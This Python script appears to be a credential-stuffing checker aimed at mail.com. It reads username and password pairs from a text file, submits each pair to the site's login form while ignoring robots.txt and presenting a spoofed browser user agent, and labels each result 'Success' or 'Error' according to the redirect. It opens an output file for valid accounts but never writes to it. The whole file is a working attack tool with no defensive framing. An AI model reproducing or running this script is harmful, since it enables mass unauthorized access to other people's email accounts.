import mechanize
import cookielib
from colorama import init, Fore

init(convert=True)

with open('OutputValidMail.txt', 'w') as outputMailFile:
    with open('InputKeyMail.txt') as inputKey:
        for line in inputKey:
            t = line.split(' ')
            if len(t) == 1:
                continue
            username = t[0].strip()
            password = t[1].strip()
            br = mechanize.Browser()
            url = 'https://www.mail.com/'
            cookiejar = cookielib.LWPCookieJar()
            br.set_cookiejar( cookiejar )
            br.set_handle_equiv( True )
            br.set_handle_gzip( True )
            br.set_handle_redirect( True ) 
            br.set_handle_referer( True )
            br.set_handle_robots( False )
            br.addheaders = [ ('user-agent', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/79.0.108 Chrome/73.0.3683.108 Safari/537.36' ) ]
            br.open(url)
            br.select_form(nr=0)
            br.form["username"] = username
            br.form['password'] = password
            print(Fore.BLUE + username)
            print(Fore.BLUE + password)
            response = br.submit().geturl()
            if response == 'https://www.mail.com/int/logout/?ls=wd':
                print(Fore.RED + 'Error')
                continue
            else:
                print(Fore.GREEN + 'Success')
